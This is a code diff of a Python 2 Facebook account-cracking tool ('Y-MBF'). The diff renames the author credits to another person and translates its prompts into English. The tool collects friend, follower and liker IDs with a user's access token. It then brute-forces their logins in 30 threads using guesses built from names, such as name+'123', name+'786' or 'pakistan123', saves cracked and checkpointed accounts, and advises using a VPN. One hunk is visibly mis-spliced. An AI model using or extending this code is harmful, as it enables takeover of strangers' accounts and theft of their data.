@@ -4,11 +4,11 @@
 #######################################################
 # Name           : Y-MBF (MBF) <token method>         #
 # File           : ymbf.py                            #
-# Author         : Moch Yayan Juan Alvredo XD.        #
-# Github         : https://github.com/Yayan-XD        #
-# Facebook       : https://www.facebook.com/KM39453   #
-# Instagram      : https://www.instagram.com/yayanxd_ #
-# Fansfage       : https://www.facebook.com/Yayanxyz  #
+# Author         : Asim Rauf.        #
+# Github         : https://github.com/AsimBot       #
+# Facebook       : https://www.facebook.com/AsimBot   #
+# Instagram      : https://www.instagram.com/AsimBot_ #
+# Fansfage       : https://www.facebook.com/AsimBotz  #
 # Blogspot       : https://squadcyberpeopleteam.blogspot.com #
 # Python version : 2.7                                #
 #######################################################
@@ -106,9 +106,9 @@ logo = ''' \033[0;96m
 \_| |_/___/_|_| |_| |_|   \_/\___/ \___/|_|
                                            
                                            
-\033[0m|| Created By YayanXD
- \033[0;96m \033[0m|| Github.com/Yayan-XD
- \033[0;96m \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
+\033[0m|| Created By Asim Rauf
+ \033[0;96m \033[0m|| Github.com/AsimBot
+ \033[0;96m \033[0;91mv2.0  \033[0m|| Facebook.com/wbuAsim'''
 # crack selesai
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
@@ -122,14 +122,14 @@ xi_jimpinx = '1714000985456399'
 # Token FB bukan token PLN
 def yayanxd():
 	os.system('clear')
-	print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
+	print (' %s*%s login via fb token.\n %s*%s open chrome for old accounts token?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
 	__cindy__ = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
 	if __cindy__ in ('open', 'Open', 'OPEN'):
-		print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
-		print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
-		print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
+		print '\n%s *%s open google chrome for token'%(B,N);time.sleep(2)
+		print '%s *%s via mobile url %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
+		print '%s *%s open google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
 		print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
-		raw_input(' %s*%s tekan enter '%(O,N))
+		raw_input(' %s*%s Enter Token '%(O,N))
 		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
 		yayanxd()
 	try:
@@ -139,11 +139,11 @@ def yayanxd():
 		zedd = open('__yayan__.txt', 'w')
 		zedd.write(__cindy__)
 		zedd.close()
-		print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N)
+		print '\n\n %s*%s successfully login %s%s%s'%(O,N,K,nama,N)
 		time.sleep(2)
-		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
+		print ' %s*%s This Premium command enter license from AsimBot...'%(O,N)
 		time.sleep(2)
-		raw_input(' %s*%s tekan enter '%(O,N))
+		raw_input(' %s*%s Enter Token '%(O,N))
 		os.system('xdg-open https://www.youtube.com/channel/UCQOXevovzqXBX9nGeesWfuw')
 		kontol()
 	except KeyError:
@@ -185,12 +185,12 @@ def moch_yayan():
     print ' [%s2%s]. DUMP PUBLIC'%(O,N)
     print ' [%s3%s]. DUMP TOTAL FOLLOWERS'%(O,N)
     print ' [%s4%s]. DUMP LIKES OF POST'%(O,N)
-    print ' [%s5%s]. RANDOM CRACK'%(O,N)
+    print ' [%s5%s]. START CRACK'%(O,N)
     print ' [%s6%s]. CHECK USER INFORMATION'%(O,N)
     print ' [%s7%s]. CHECK OK ACCOUNTS'%(O,N)
     print ' [%s8%s]. Settings user agent'%(O,N)
     print ' [%s9%s]. Ingfo %sscript'%(O,N,O)
-    print ' %s[%s0%s]. logout (%shapus token%s)'%(N,M,N,M,N)
+    print ' %s[%s0%s]. logout (%sdelete token%s)'%(N,M,N,M,N)
     awokawokawokawokawokawokawokawokawokawokawokawok()
 def awokawokawokawokawokawokawokawokawokawokawokawok():
         yan = raw_input('\n [*] menu : ')
@@ -286,7 +286,7 @@ def teman():
         os.mkdir('dump')
     except:pass
     try:
-        mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
+        mmk = raw_input('\n %s[%s?%s] file name  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
         id = []
@@ -302,8 +302,8 @@ def teman():
             time.sleep(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
+        jalan('\n\n %s[%s✓%s] successfully dumped'%(N,H,N))
+        print ' [%s•%s] copy this 👉 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N))
         moch_yayan()
@@ -330,7 +330,7 @@ def publik():
     except:pass
     try:
         csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
-        ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
+        ahh = raw_input(' %s[%s?%s] file name  : '%(N,O,N))
         ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
         id = []
@@ -346,7 +346,7 @@ def publik():
             time.sleep(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
+        jalan('\n\n %s[%s✓%s] successfully dumped publik'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,kntl,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N))
@@ -370,7 +370,7 @@ def followers():
     except:pass
     try:
         csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
-        mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
+        mmk = raw_input(' %s[%s?%s] file name  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
         id = []
@@ -410,7 +410,7 @@ def postingan():
     except:pass
     try:
         csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
-        ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
+        ppk = raw_input(' %s[%s?%s] file name  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,__cindy__))
         id = []
@@ -571,11 +571,11 @@ def cek_ingfo():
 def info_tools():
     os.system('clear')
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
-    print '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Yt       : Hesuka Plays'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Author   : Asim Rauf .'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Github   : https://github.com/AsimBot'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Facebook : https://www.facebook.com/ter'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/asimrauf667'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s>%s] Instagram: https://www.instagram.com/Asim'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
@@ -615,7 +615,7 @@ def yo_ndak_tau_ko_tanya_saia():
 		uas.write(ua)
 		uas.close()
 		time.sleep(2)
-		jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
+		jalan('\n %s[%s✓%s] added self user agent...'%(N,H,N))
 		time.sleep(2)
 		moch_yayan()
 	except (KeyError, IOError):
@@ -648,7 +648,7 @@ class __crack__:
             time.sleep(3)
             moch_yayan()
 
-        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
+        ___yayanganteng___ = raw_input(' [%s?%s] for manual password select Y otherwise t [Y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
@@ -657,16 +657,16 @@ class __crack__:
                 if pwek == '':
                     print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                 elif len(pwek)<=5:
-                	print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
+                	print '\n %s[%s×%s] 6 character pass'%(N,M,N)
                 else:
                     def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                         cin = raw_input('\n [*] method : ')
                         if cin == '':
                             self.__yan__()
                         elif cin == '1':
-                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\n [%s!%s] \n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -680,9 +680,9 @@ class __crack__:
                             hasil(ok,cp)
                             exit()
                         elif cin == '2':
-                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\n [%s!%s] only crack with cellular data or use premium vpn\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -696,9 +696,9 @@ class __crack__:
                             hasil(ok,cp)
                             exit()
                         elif cin == '3':
-                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\n [%s!%s] only crack with cellular data or use premium vpn\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -715,14 +715,14 @@ class __crack__:
                             print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
                             time.sleep(2)
                             moch_yayan()
-                    print '\n [ pilih method login - silahkan coba satu² ]\n'
+                    print '\n [ select login method ]\n'
                     print ' [%s1%s]. method API (fast)'%(O,N)
                     print ' [%s2%s]. method mbasic (slow)'%(O,N)
                     print ' [%s3%s]. method mobile (super slow)'%(O,N)
                     __yan__(pwek.split(','))
                     break
         elif ___yayanganteng___ in ('T', 't'):
-            print '\n [ pilih method login - silahkan coba satu² ]\n'
+            print '\n [ select login method ]\n'
             print ' [%s1%s]. method API (fast)'%(O,N)
             print ' [%s2%s]. method mbasic (slow)'%(O,N)
             print ' [%s3%s]. method mobile (super slow)'%(O,N)
@@ -744,7 +744,7 @@ class __crack__:
             try:
             	user_agent = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
+            	user_agent = requests.get('https://raw.githubusercontent.com/AsimBot/CHK/main/data/user_agent.txt').text.strip()
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -796,7 +796,7 @@ class __crack__:
             try:
             	user_agent = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
+            	user_agent = requests.get('https://raw.githubusercontent.com/AsimBot/CHK/main/data/user_agent.txt').text.strip()
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -847,7 +847,7 @@ class __crack__:
             try:
             	user_agent = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
+            	user_agent = requests.get('https://raw.githubusercontent.com/AsimBot/CHK/main/data/user_agent.txt').text.strip()
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -895,9 +895,9 @@ class __crack__:
         if yan == '':
             self.__pler__()
         elif yan in ('1', '01'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s!%s] only crack with cellular data or use premium vpn\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -905,32 +905,62 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             raimuuu = [
-                            	xz[0], xz[0]+'123', xz[0]+'1234',
-                            	xz[0]+'12345', xz[0]+'12', xz[0]+'786',
-                                xz[0]+'1234', xz[0]+'1122',   
+                                xz[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345', xz[0]+'12',
+                                xz[0]+'1234', xz[0]+'1122',
+                                xz[0]+'786',   
                             ]
                         elif len(xz) == 2:
-                        	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                        		xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
-                        	]
+                            raimuuu = [
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                            ]
                         elif len(xz) == 3:
-                        	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
-                        		xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
-                        	]
+                            raimuuu = [
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
+                            ]
                         elif len(xz) == 4:
-                        	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
-                                xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
-                        		xz[3]+'123', xz[3]+'12345', xz[3]+'1122', xz[3]+'786', xz[3]+'1234',
-                        	]
+                            raimuuu = [
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
+                                xz[3]+'123', xz[3]+'12345',
+                                xz[3]+'1122', xz[3]+'786', xz[3]+'1234',
+                            ]
                         else:
-                        	raimuuu = [
-                        		'pakistan', '786786',
-                        		'pakistan12', 'pakistan123'
+                            raimuuu = [
+                                'pakistan', '786786',
+                                'pakistan12', 'pakistan123'
+                            ]
+                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
+                    except:
+                        pass
+
+            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+            os.remove(self.apk)
+            hasil(ok,cp)
+            exit()
+        elif yan in ('2', '02'):
+            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s!%s] only crack with cellular data or use premium vpn\n'%(M,N)
+            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        bb = yntks.split('<=>')
+                        xz = bb[1].split(' ')
+                        if len(xz) == 1:
+
                         	]
                         __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                     except:
@@ -941,9 +971,9 @@ class __crack__:
             hasil(ok,cp)
             exit()
         elif yan in ('2', '02'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s!%s] only crack with cellular data or use premium vpn\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -951,27 +981,37 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             raimuuu = [
-                            	xz[0], xz[0]+'123', xz[0]+'1234',
-                                xz[0]+'12345', xz[0]+'12', xz[0]+'786',
-                                xz[0]+'1234', xz[0]+'1122',   
+                                xz[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345', xz[0]+'12',
+                                xz[0]+'1234', xz[0]+'1122',
+                                xz[0]+'786',   
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
-                                xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
                             ]
                         elif len(xz) == 3:
                             raimuuu = [
-                                xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
-                                xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
                             ]
                         elif len(xz) == 4:
                             raimuuu = [
-                                xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
-                                xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
-                                xz[3]+'123', xz[3]+'12345', xz[3]+'1122', xz[3]+'786', xz[3]+'1234',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
+                                xz[3]+'123', xz[3]+'12345',
+                                xz[3]+'1122', xz[3]+'786', xz[3]+'1234',
                             ]
                         else:
                             raimuuu = [
@@ -987,9 +1027,9 @@ class __crack__:
             hasil(ok,cp)
             exit()
         elif yan in ('3', '03'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print '\n [%s+%s] open ok accounts -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] open cp accounts -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s!%s] \n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -997,27 +1037,37 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             raimuuu = [
-                            	xz[0], xz[0]+'123', xz[0]+'1234',
-                                xz[0]+'12345', xz[0]+'12', xz[0]+'786',
-                                xz[0]+'1234', xz[0]+'1122',   
+                                xz[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345', xz[0]+'12',
+                                xz[0]+'1234', xz[0]+'1122',
+                                xz[0]+'786',   
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
-                                xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
                             ]
                         elif len(xz) == 3:
                             raimuuu = [
-                                xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
-                                xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
                             ]
                         elif len(xz) == 4:
                             raimuuu = [
-                                xz[0], xz[0]+'123', xz[0]+'12345', xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
-                                xz[1]+'123', xz[1]+'12345', xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
-                                xz[2]+'123', xz[2]+'12345', xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
-                                xz[3]+'123', xz[3]+'12345', xz[3]+'1122', xz[3]+'786', xz[3]+'1234',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[0]+'1122', xz[0]+'786', xz[0]+'1234',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[1]+'1122', xz[1]+'786', xz[1]+'1234',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[2]+'1122', xz[2]+'786', xz[2]+'1234',
+                                xz[3]+'123', xz[3]+'12345',
+                                xz[3]+'1122', xz[3]+'786', xz[3]+'1234',
                             ]
                         else:
                             raimuuu = [
